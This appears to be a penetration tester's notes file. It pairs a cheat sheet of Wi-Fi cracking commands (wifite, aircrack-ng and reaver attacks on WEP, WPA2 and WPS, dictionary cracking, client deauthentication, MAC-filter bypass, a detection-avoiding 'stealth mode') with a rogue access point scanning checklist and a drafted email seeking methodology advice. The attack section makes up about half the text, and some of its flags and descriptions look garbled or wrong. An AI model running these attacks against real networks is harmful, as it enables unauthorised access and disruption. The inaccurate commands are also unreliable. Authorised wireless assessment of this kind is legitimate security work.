 
    ____  ____  ________  _________       __________  ________    ________________    _____ _________    _   __
   / __ \/ __ \/ ____/ / / / ____/ |     / /  _/ __ \/ ____/ /   / ____/ ___/ ___/   / ___// ____/   |  / | / /
  / /_/ / / / / / __/ / / / __/  | | /| / // // /_/ / __/ / /   / __/  \__ \\__ \    \__ \/ /   / /| | /  |/ / 
 / _, _/ /_/ / /_/ / /_/ / /___  | |/ |/ // // _, _/ /___/ /___/ /___ ___/ /__/ /   ___/ / /___/ ___ |/ /|  /  
/_/ |_|\____/\____/\____/_____/  |__/|__/___/_/ |_/_____/_____/_____//____/____/   /____/\____/_/  |_/_/ |_/   


##########################################
#####   Basic Rogue Wireless Scan    #####
##########################################
#####                                #####
#####   login = kali : kali          #####
#####                                #####
#####   sudo airmon-ng check kill    #####
#####   sudo airmon-ng start wlan0   #####
#####   sudo wifite                  #####
#####                                #####
##########################################


# Read pcap files
aircrack-ng -J filtered <file_name>.pcap > <file_name>.txt

ðŸ”¥ Aggressive Full Attack (All Possible Methods)
sudo wifite --kill --verbose --wps --wps-only --pmkid --pixie --handshake --force --dict /path/to/wordlist.txt


#########################################################################################################
###  _       ___           __                   ____                ______          __  _             ###
### | |     / (_)_______  / /__  __________    / __ \___  ____     /_  __/__  _____/ /_(_)___  ____ _ ### 
### | | /| / / / ___/ _ \/ / _ \/ ___/ ___/   / /_/ / _ \/ __ \     / / / _ \/ ___/ __/ / __ \/ __ `/ ###
### | |/ |/ / / /  /  __/ /  __(__  |__  )   / ____/  __/ / / /    / / /  __(__  ) /_/ / / / / /_/ /  ###
### |__/|__/_/_/   \___/_/\___/____/____/   /_/    \___/_/ /_/    /_/  \___/____/\__/_/_/ /_/\__, /   ### 
###                                                                                         /____/    ###
### 																				                  ###
#########################################################################################################


wifite -e <ESSID_MyWiFi>                # Automated attack on spcified ESSID. WPA handshake capture, WEP techniqus, WPS PIN-basd attacks
wifite -e MyWiFi --dict ./rockyou.txt   # Wordlist specified
wifite -e MyWiFi -c 6                   # Target only networks on specific channel
wifite -e MyWiFi --wps                  # Force WPS attack (if WPS is enabled)
wifite -e MyWiFi --pixie                # Pixie-Dust WPS attack
wifite -e MyFiFi -p                     # Stop after first handshake capture
wifite -e MyWiFi --force                # Attacks not working? try to bypass security measures


### Goto First ###
Best for WEP â†’ wifite --wep --replay --fakeauth
Best for WPA2 â†’ wifite --wpa --dict /usr/share/wordlists/rockyou.txt
Best for WPA2 without a handshake â†’ wifite --wpa --pmkid
Best for WPS â†’ wifite --wps --pixie
Stealth Mode (Avoid Detection) â†’ wifite --mac --quiet

### WEP Attacks ###
wifite --wep --replay     # ARP Relay Attack. Speeds up packet collection. Great when a client is connected.
wifite --wep --fakeauth   # Fake Authentication Attack. Forces association with AP for packt injion. Use when ARP replay alone isn't working.
wifite --wep --fragment   # Fragmentation Attack. Generate keystreams used to create ARP packets
wifite --wep --chopchop   # Chop-Chop Attack. Decrypts packets byte by byte. Can reconstruct the WP ket without APR traffic
wifite --wp --ptw         # PTW Attack. Speds up WEP cracking with at least 20K IVs are captured

### WPA/WPA2 Attacks ###
wifite --wpa --dict /usr/share/wordlists/rockyou.txt     # Basic Handshake Capture w/Dictionary Attack. Captures WPA handshake and uses a dictionary attack. Works well against weak passwords.
wifite --wpa --force     # Force Client Deauth. Kicks clients off the network, forcing a reconnection. Ensures you capture the handshake quickly.
wifite --wps --pixie     # Pixie-Dust Attack (if WPS Enabled). Exploits PIN weakness without handshake. Effective on vulnerable routers.
wifite --wpa --pmkid     # PMKID Hash Attack (Offline WPA2 Cracking). Attacks WPA2 without needing a client to connect. Works on routers vulnerable to PMKID capture attacks.
wifite --wpa --mac       # MAC Filtering Bypass (Using a Random MAC Address). Changes your MAC address to bypass AP filtering. Useful if your device is blocked from association.

### WPS Attacks (If WPS is Enabled) ###
wifite --wps     # Default WPS PIN Attack. Tries common WPS PINs against the router. Works if the router has a weak or default PIN.
wifite --wps --pixie          #  Pixie-Dust Attack (Offline Exploit). Exploits WPS key exchange to crack PINs instantly. Works without needing to capture a handshake.
wifite --wps --bruteforce     # Bruteforce WPS PIN Attack. Tries all possible WPS PIN combinations. Can take hours, but works on many old routers.
wifite --wps --stop           # Stop After First Valid WPS Pin Found. Stops immediately after finding a valid PIN. Avoids unnecessary retries and detection.
wifite --wps --ignore-locks   # Ignore Locked APs and Only Attack Vulnerable WPS Routers. Skips routers that have locked WPS. Saves time by only attacking vulnerable targets.
reaver -i wlan0mon -b <BSSID> -c <CHANNEL> -vv     # Advanced WPS attack when 'wifite --wps --pixie' fails.

### Additional Notes ###
kali wordlists = /usr/share/wordlists/rockyou.txt.gz
If the handshake capture is too slow, run airodump-ng wlan0mon to check client activity before launching wifite.

/===========================================================================\
| Tool         | Description                  | Use Case                    |
|--------------|------------------------------|-----------------------------|
| Wifite       | Automated Wi-Fi attacks      | Best for quick hacks        |
| Aircrack-ng  | WPA2 cracking                | More control over attacks   |
| Bettercap    | MITM & packet sniffing       | Real-time packet injection  |
| Reaver       | WPS PIN brute force          | Advanced WPS exploitation   |
| Fluxion      | Fake AP phishing attacks     | Captive portal attacks      |
| Kismet       | Passive Wi-Fi monitoring     | Undetectable reconnaissance |
| Fern Wi-Fi   | GUI-based Wi-Fi cracking     | Easier for beginners        |
| Wifiphisher  | Wi-Fi phish & evil twin APs  | Advanced social engineering |
\===========================================================================/





#################################################################################################################################
#################################################################################################################################


# Device Interface Check
ip a2
iw dev
iwconfig wlan0

# Monitor Mode
sudo airmon-ng start wlan0
sudo airmon-ng stop wlan0

OR

sudo ip link set wlan0 down
sudo iw wlan0 set monitor none
sudo ip link set wlan0 up

# Capture

sudo wifite

sudo airodump-ng wlan0

#################################################################################################################################


# Rogue Wireless Scan Checklist with Kali Linux & Aircrack-ng
# -----------------------------------------------------------
# This script provides a structured approach to scanning for rogue wireless access points (APs) using Aircrack-ng on Kali Linux.

# 1. PREPARATION
# --------------
# Ensure the necessary tools are installed
sudo apt update && sudo apt install -y aircrack-ng

# List all network interfaces
ip a

# Identify your wireless interface (e.g., wlan0)
iw dev

# Put the wireless interface into monitor mode
sudo ip link set wlan0 down
sudo iw wlan0 set monitor none
sudo ip link set wlan0 up

# Verify monitor mode
iwconfig wlan0

# 2. SCANNING FOR WIRELESS NETWORKS
# ---------------------------------
# Start scanning for nearby Wi-Fi networks
sudo airodump-ng wlan0

# Allow scanning for at least 30 seconds before stopping with Ctrl+C

# 3. IDENTIFYING ROGUE ACCESS POINTS
# -----------------------------------
# Look for:
# - Unauthorized SSIDs
# - Unexpected BSSIDs (MAC addresses)
# - Unusual signal strengths or locations
# - Open networks with no encryption

# 4. TARGETING SUSPICIOUS NETWORKS
# --------------------------------
# If a rogue AP is suspected, capture packets for further analysis
sudo airodump-ng -c <channel> --bssid <BSSID> -w rogue_scan wlan0

# Example: Capture packets on channel 6 from BSSID AA:BB:CC:DD:EE:FF
# sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w rogue_scan wlan0

# 5. CHECKING ENCRYPTION AND AUTHENTICATION
# -----------------------------------------
# Analyze the captured packets
aircrack-ng -a2 -w /usr/share/wordlists/rockyou.txt -b <BSSID> rogue_scan-01.cap

# 6. DEAUTH ATTACK (IF AUTHORIZED FOR TESTING)
# --------------------------------------------
# Warning: Only perform this step if you have explicit authorization!
# Send deauthentication packets to disconnect clients from the rogue AP
sudo aireplay-ng --deauth 10 -a <BSSID> wlan0

# 7. RESTORING NETWORK SETTINGS
# -----------------------------
# Disable monitor mode and restore normal operation
sudo ip link set wlan0 down
sudo iw wlan0 set type managed
sudo ip link set wlan0 up

# Verify that the interface is back in managed mode
iwconfig wlan0

# 8. REPORT FINDINGS
# ------------------
# Document:
# - SSID/BSSID of rogue AP
# - Channel and frequency
# - Encryption type
# - Clients connected
# - Any suspicious behavior

# END OF CHECKLIST


Summary: How to Find a Rogue AP Without a Known List
Step	What to Look For
1. Scan for Networks	Identify SSIDs that match the business, sort by signal strength
2. Check for Duplicate SSIDs	Multiple APs broadcasting the same name on different channels
3. Analyze MAC Addresses	Check vendor lookups, look for generic/home-grade hardware
4. Detect Open/Weak Encryption	Business APs should not be open or using WEP
5. Monitor Client Behavior	Clients connecting to unexpected networks, APs dropping connections
6. Capture & Analyze Packets	Use airodump-ng and Wireshark to look for rogue AP patterns



Subject: Advice on Rogue Wireless Scanning Methodology

I wanted to reach out for some advice on conducting a structured rogue wireless scan engagement. I have experience with wireless security assessments, including WEP cracking (which I mastered years ago) and WPA2/WPA3 attacks, so I'm familiar with the challenges of brute forcing. Iâ€™m also well-versed in Kali Linux and Aircrack-ng.

What Iâ€™m looking for is a well-organized methodology or checklist for a rogue wireless assessmentâ€”something that outlines the essential tests to perform, the key data points to capture, and any recommended post-processing or analysis steps.

Hereâ€™s what I currently do:
1. **Passive Scanning** â€“ Identifying SSIDs, BSSIDs, and unusual activity with `airodump-ng`.
2. **Channel & Encryption Analysis** â€“ Checking for unencrypted APs, weak security settings, and misconfigured networks.
3. **Client Association & Probe Requests** â€“ Identifying which clients are connected to unauthorized APs.
4. **Packet Capture & Analysis** â€“ Capturing packets for further investigation with `tshark` or `Wireshark`.
5. **Authorized Deauth Testing** â€“ Checking resilience to deauthentication attacks (when authorized).

Iâ€™d love to hear your perspective on any critical steps I might be missing, specific indicators of rogue APs, or any automation tools that could streamline the process.

Thanks in advance for your insights!